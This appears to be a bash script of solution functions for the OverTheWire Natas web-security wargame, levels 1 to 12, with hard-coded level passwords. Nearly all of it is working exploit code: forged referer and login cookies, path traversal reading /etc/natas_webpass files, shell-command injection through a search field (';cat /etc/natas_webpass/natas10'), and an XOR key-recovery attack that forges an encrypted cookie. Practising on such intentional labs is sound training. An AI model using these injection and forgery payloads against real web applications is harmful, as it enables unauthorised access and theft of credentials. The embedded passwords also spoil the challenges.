natas1_exp () 
{ 
    curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/ | grep --color=auto -o "\w\{32\}"
}

natas2_exp () 
{ 
    curl -s -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org/ | grep --color=auto -o "\w\{32\}" | tail -n 1
}

natas3_exp () 
{ 
    curl -s -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt | grep --color=auto -o "\w\{32\}"
}

natas4_exp () 
{ 
    curl -s -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | awk -F':' '{print $2}'
}

natas5_exp () 
{ 
    curl -s -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ -A "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8" --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/ | grep --color=auto -o "\w\{32\}" | tail -n 1
}

natas6_exp () 
{ 
    curl -s -u natas5:$(natas5_exp) -A "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8" --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org/ | grep --color=auto -o "\w\{32\}" | tail -n1
}

natas7_exp ()
{
		key6=$(curl -s -u natas6:$(natas6_exp) -A "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"  http://natas6.natas.labs.overthewire.org/includes/secret.inc | grep  -o "\w\+\"" | tr -d "\"" ); 
		
		curl -s -u natas6:$(natas6_exp) -A "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"  -X POST -d secret="$key6" -d submit="Submit+Query" http://natas6.natas.labs.overthewire.org/index.php | grep -o "\w\+\{32\}" | tail -n1 
}

natas8_exp () 
{ 
    curl -s -u natas7:$(natas7_exp) -A "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8" http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 | grep --color=auto -o "\w\+\{32\}" | tail -n1
}

natas9_exp () 
{ 
    key8=$(echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d);
    curl -s -u natas8:$(natas8_exp) -A "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8" http://natas8.natas.labs.overthewire.org/index.php -d secret="$key8" -d submit="Submit+Query" | grep --color=auto -o "\w\+\{32\}" | tail -n1
}
natas10_exp () 
{ 
    curl -s -u natas9:$(natas9_exp) -A "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8" http://natas9.natas.labs.overthewire.org/index.php --data-urlencode needle="\"\" \"\" ; cat /etc/natas_webpass/natas10 ;#" -d submit="Search" --trace-ascii - | grep --color=auto -o "\w\+\{32\}" | tail -n1
}
natas11_exp () 
{ 
    curl -s -u natas10:$(natas10_exp) -A "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8" http://natas10.natas.labs.overthewire.org/ --data-urlencode needle="\"\" /etc/natas_webpass/natas11 #" -d submit="Search" --trace-ascii - | grep --color=auto -o "\w\+\{32\}" | tail -n1
}

natas12_exp()
{
	default_json='{"showpassword":"no","bgcolor":"#ffffff"}'
	ending_json='{"showpassword":"yes","bgcolor":"#ffffff"}'
	
	enc=$(curl -s -u natas11:$(natas11_exp) -A "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8" http://natas11.natas.labs.overthewire.org/ --cookie-jar - | awk -F'data' '{print $2}' | tail -n1 |  tr -d '[:space:]' | tr -d '%3D')

	unenc=$(echo $enc | base64 -d 2>/dev/null) 

	key=();
	hexout='';

	for (( i=0 ; i<${#unenc}; i++ ))
	do
		dec_char=$( printf "%d" "'${unenc:$i:1}" )
		json_dec_char=$( printf "%d" "'${default_json:$i:1}" )
		
		if [ $i -lt 4 ]
		then
			key+=($(( $dec_char ^ $json_dec_char )))
		fi
	done
	
	#echo "${key[@]}"
	
	for (( i=0 ; i<${#ending_json}; i=i+1 ))
	do
		ending_json_dec_char=$( printf "%d" "'${ending_json:$i:1}" )
		tmp_xor_dec=$(( $ending_json_dec_char ^ ${key[ $(( $i % ${#key[@]} )) ]} ))
		tmp_hex=$(printf "%02x" $tmp_xor_dec)
		hexout=$hexout$tmp_hex
		#echo $tmp_hex
	done	
		
	ending_enc="$( echo "$hexout" | xxd -r -p | base64 )="
	
	curl -s -u natas11:$(natas11_exp) -A "Mozilla/5.0 (X11; U; Linux x    86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8" http://natas11.natas.labs.overthewire.org/ --cookie data="$ending_enc" | grep -o "\w\+\{32\}" | tail -n1

}
